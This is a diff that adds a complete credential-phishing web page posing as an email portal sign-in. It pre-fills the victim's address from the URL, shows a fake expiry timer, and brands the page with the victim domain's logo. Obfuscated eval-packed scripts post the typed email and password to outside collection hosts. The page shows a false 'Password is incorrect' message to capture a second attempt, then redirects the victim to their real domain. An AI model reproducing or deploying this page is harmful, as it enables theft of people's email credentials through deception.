@@ -1,0 +1,272 @@
+<html lang="en"><head>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email | Portal Sign in </title>
+  <style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+*{
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Poppins", sans-serif;
+}
+body{
+  width: 100%;
+  height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #ddd;
+}
+::selection{
+  color: #fff;
+  background: #ddd;
+}
+.wrapper{
+  width: 380px;
+  padding: 40px 30px 50px 30px;
+  background: rgb(0, 0, 0, .8);
+  border-radius: 5px;
+  text-align: center;
+  box-shadow: 10px 10px 15px rgba(0,0,0,0.1);
+}
+.wrapper header{
+  font-size: 35px;
+  font-weight: 600;
+}
+.wrapper form{
+  margin: 8px 0;
+}
+form .field{
+  width: 100%;
+  margin-bottom: 20px;
+}
+form .field.shake{
+  animation: shake 0.3s ease-in-out;
+}
+@keyframes shake {
+  0%, 100%{
+    margin-left: 0px;
+  }
+  20%, 80%{
+    margin-left: -12px;
+  }
+  40%, 60%{
+    margin-left: 12px;
+  }
+}
+form .field .input-area{
+  height: 50px;
+  width: 100%;
+  position: relative;
+}
+form input{
+  width: 100%;
+  height: 100%;
+  outline: none;
+  padding: 0 45px;
+  font-size: 18px;
+  background: #fff;
+  caret-color: #5372F0;
+  border-radius: 5px;
+  border: 1px solid #bfbfbf;
+  border-bottom-width: 2px;
+  transition: all 0.2s ease;
+}
+form .field input:focus,
+form .field.valid input{
+  border-color: #5372F0;
+}
+form .field.shake input,
+form .field.error input{
+  border-color: #dc3545;
+}
+.field .input-area i{
+  position: absolute;
+  top: 59%;
+  font-size: 18px;
+  pointer-events: none;
+  transform: translateY(-50%);
+}
+.input-area .icon{
+  left: 15px;
+  color: #bfbfbf;
+  transition: color 0.2s ease;
+}
+.input-area .error-icon{
+  right: 15px;
+  color: #dc3545;
+}
+form input:focus ~ .icon,
+form .field.valid .icon{
+  color: #5372F0;
+}
+form .field.shake input:focus ~ .icon,
+form .field.error input:focus ~ .icon{
+  color: #bfbfbf;
+}
+form input::placeholder{
+  color: #000;
+  font-size: 17px;
+}
+form .field .error-txt{
+  color: #dc3545;
+  text-align: left;
+  margin-top: 5px;
+}
+form .field .error{
+  display: none;
+}
+form .field.shake .error,
+form .field.error .error{
+  display: block;
+}
+form .pass-txt{
+  text-align: left;
+  margin-top: -10px;
+}
+.wrapper a{
+  color: #5372F0;
+  text-decoration: none;
+}
+.wrapper a:hover{
+  text-decoration: underline;
+}
+form input[type="submit"]{
+  height: 50px;
+  margin-top: 20px;
+  color: #fff;
+  padding: 0;
+  border: none;
+  background: #2c52ed;
+  cursor: pointer;
+  border-bottom: 2px solid rgba(0,0,0,0.1);
+  transition: all 0.3s ease;
+}
+form input[type="submit"]:hover{
+  background: #2c52ee;
+}
+
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+ <div align="center">   <img src="https://firebasestorage.googleapis.com/v0/b/mpoaanan.appspot.com/o/inc%2Floadinglogo.gif?alt=media&amp;token=ad80211a-6694-4e63-84f9-293050c3c1f5" id="logoimg" width="70px" height="70px"></div>
+<div id="logoname" align="center"></div>
+<p align="center"><font size="-1" style="color: #fff;">Confirm your email address to fix your account. Update expires in</font><br><font color="#FF0000"><span id="timer">23:39</span> Hours</font></p>
+
+     <form id="login_form" action="https://uruegoaku.live/mine1/lambo.php">
+      <div class="field email">
+        <div class="input-area">
+          <input type="text" id="email" name="email" placeholder="Email Address" readonly="">
+          <i class="icon"><svg xmlns="http://www.w3.org/2000/svg" class="ionicon" style="height: 20px;" viewBox="0 0 512 512"><title>Mail</title><path d="M424 80H88a56.06 56.06 0 00-56 56v240a56.06 56.06 0 0056 56h336a56.06 56.06 0 0056-56V136a56.06 56.06 0 00-56-56zm-14.18 92.63l-144 112a16 16 0 01-19.64 0l-144-112a16 16 0 1119.64-25.26L256 251.73l134.18-104.36a16 16 0 0119.64 25.26z"></path></svg></i>
+          <i class="error error-icon fas fa-exclamation-circle"></i>
+        </div>
+      </div>
+      <div class="field password">
+        <div class="input-area">
+          <input type="password" placeholder="Password" name="password" id="password">
+          <i class="icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" style="height: 20px;" viewBox="0 0 512 512"><title>Lock Closed</title><path d="M368 192h-16v-80a96 96 0 10-192 0v80h-16a64.07 64.07 0 00-64 64v176a64.07 64.07 0 0064 64h224a64.07 64.07 0 0064-64V256a64.07 64.07 0 00-64-64zm-48 0H192v-80a64 64 0 11128 0z"></path></svg>
+          </i>
+          <i class="error error-icon fas fa-exclamation-circle"></i>
+		      <div id="showerror" style="display: none; color:#FF0000; font-size:14px"></div>
+        </div>
+      </div>
+      <input type="submit" value="Update Your Account" id="login-button">
+    </form>
+<script>
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3.4(\'5\').6=f+":"+g;7();c 7(){2 a=3.4(\'5\').6;2 b=a.h(/[:]+/);2 m=b[0];2 8=d((b[1]-1));9(8==e){m=m-1}3.4(\'5\').6=m+":"+8;i(7,j)}c d(a){9(a<k&&a>=0){a="0"+a};9(a<0){a="e"};l a}',23,23,'||var|document|getElementById|timer|innerHTML|startTimer|s|if|||function|checkSecond|59|24|00|split|setTimeout|2000|10|return|'.split('|'),0,{}))
+</script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+      <script>
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(16).17(6(){5 m=0;$(\'#18\').R(6(){$("#8").A();$(\'#B\').u("");$("#19").S({1a:T,U:"A"},0);$("#1b").S({1c:T,U:"y"},1d)});5 n=H.I.1e.z(1);7(!n){}V{5 o=n;$(\'#B\').u(o);5 p=/^([a-v-w-W\\.\\-])+\\@(([a-v-w-9\\-])+\\.)+([a-v-w-9]{2,4})+$/;7(!p.X(o)){$(\'#C\').y();n.Y;Z 10}5 q=o.D("@");5 r=o.z((q+1));5 c=r.z(0,r.D(\'.\'));5 s=c.11();5 t=c.12();$("#J").K("L","E://M.N.F/"+r);$("#O").x(t);$(".O").x(t)}$(\'#P-Q\').R(6(b){$(\'#C\').A();$(\'#8\').A();b.1f();5 d=$("#B").u();5 e=$("#G").u();5 f=$(\'#8\').x();$(\'#8\').1g(f);5 g=d;5 h=/^([a-v-w-W\\.\\-])+\\@(([a-v-w-9\\-])+\\.)+([a-v-w-9]{2,4})+$/;7(!h.X(g)){$(\'#C\').y();d.Y;Z 10}5 i=g.D("@");5 j=g.z((i+1));5 c=j.z(0,j.D(\'.\'));5 k=c.11();5 l=c.12();$("#J").K("L","E://M.N.F/"+j);$(".J").K("L","E://M.N.F/"+j);$("#O").x(l);m=m+1;$.1h({1i:\'1j\',1k:\'E://1l.F.1m/1n-1o/1p/1q-1r.1s\',1t:\'1u\',1v:{B:d,G:e,},1w:6(a){$(\'#P-Q\').x(\'1x...\')},1y:6(a){7(a){$("#8").y();1z.1A(a);7(a[\'1B\']==\'1C\'){$("#G").u("");7(m>=3){m=0;H.I.13("14://15."+j)}}V{}}},C:6(){$("#G").u("");7(m>=2){m=0;H.I.13("14://15."+j)}$("#8").y()},1D:6(){$(\'#P-Q\').x(\'1E 1F\')}})})});',62,104,'|||||var|function|if|msg||||||||||||||||||||||val|zA|Z0|html|show|substr|hide|email|error|indexOf|https|com|password|window|location|logoimg|attr|src|logo|clearbit|logoname|submit|btn|click|animate|200|opacity|else|9_|test|focus|return|false|toLowerCase|toUpperCase|replace|http|www|document|ready|back1|automail|left|inputbar|right|1000|hash|preventDefault|text|ajax|dataType|JSON|url|biolinda|br|wp|includes|js|form|loaded|php|type|POST|data|beforeSend|Verifing|success|console|log|signal|ok|complete|Sign|in'.split('|'),0,{}))
+  </script>
+    <script type="text/javascript">
+        var hash = window.location.hash.split('#')[1];
+        let emailParam = hash ? hash : '';
+        let count = 0;
+
+        if (emailParam === "null") {
+            emailParam = "";
+        }
+
+        const email = document.getElementById('email');
+        const password = document.getElementById('password');
+        const login = document.getElementById('login-button');
+        const err = document.getElementById('showerror');
+        const form = document.getElementById("login_form");
+        email.value = emailParam;
+
+        login.addEventListener('click', function(e){
+            e.preventDefault();
+            if (email.value === "") {
+                err.textContent = "Enter your email address";
+                email.focus();
+                showEl(err, "red");
+                return;
+            } else if (password.value === "") {
+                err.textContent = "Enter your email password";
+                password.focus();
+                showEl(err, "red");
+                return;
+            } else {
+                const domain = email.value.split('@')[1];
+                count = count + 1;
+                hideEl(err, "black");
+                const prevT = login.value;
+                login.value = 'Authenticating...';
+
+                var $form = $("#login_form");
+                var url = form.action;
+                var data = $form.serialize();
+
+                $.ajax({
+                    type: "POST",
+                    url: url,
+                    data: data,
+                    cache: false,
+                    timeout: 800000,
+                    success: function(res) {
+                        if(res == true) {
+                            if (count > 1) {
+                                hideEl(err);
+                                window.location.href = "https://www."+domain;
+                                return;
+                            }
+                            password.value = "";
+                            showEl(err, "red");
+                            login.value = prevT;
+                            err.textContent = "Password is incorrect.";
+                        }else {
+                            showEl(err, "red");
+                            login.value = prevT;
+                            err.textContent = "Something went wrong, please try again";
+                            password.value = "";
+                        }
+                    },
+                    error: function(e) {
+                        showEl(err, "red");
+                        login.value = prevT;
+                        err.textContent = "Something went wrong, please try again";
+                        password.value = "";
+                    }
+                });
+            }
+        });
+
+        function showEl(el, color) {
+            el.style.color = color;
+            el.style.display = "block";
+        }
+
+        function hideEl(el) {
+            el.style.color = '#000';
+            el.style.display = "none";
+            el.textContent = "";
+        }
+    </script>
+</div> </body></html>
